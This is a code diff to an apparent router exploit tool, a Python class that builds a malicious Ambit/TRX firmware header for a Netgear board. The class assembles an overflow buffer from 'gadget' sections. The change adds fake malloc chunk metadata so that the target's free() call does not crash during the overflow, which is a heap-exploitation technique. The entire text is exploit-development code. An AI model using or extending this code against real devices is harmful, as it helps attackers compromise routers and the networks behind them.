@@ -52,7 +52,11 @@ class JankyAmbitHeader(object):
     #Hard code for now. We can make this configurable later.
     BOARD_ID="U12H192T00_NETGEAR"
     BOARD_ID_OFF=40
-
+    
+    #avoid crashing in free() with fake malloc_chunk.size=0
+    FREE_FIXUP_OFF=BOARD_ID_OFF+len(BOARD_ID)
+    FREE_FIXUP=0x0
+    
     def __init__(self,image_data,logger=None):
         """
         Params
@@ -117,6 +121,10 @@ class JankyAmbitHeader(object):
         SC.gadget_section(self.PART_1_CHECKSUM_OFF,
                           self.trx_image_checksum,
                           description="Checksum of the TRX image.")
+                          
+        SC.gadget_section(self.FREE_FIXUP_OFF,self.FREE_FIXUP,
+                          description="fake mem chunk metadata to avoid crashing free().")
+                          
         buf=OverflowBuffer(BigEndian,self.size,
                             overflow_sections=SC.section_list,
                             logger=logger)
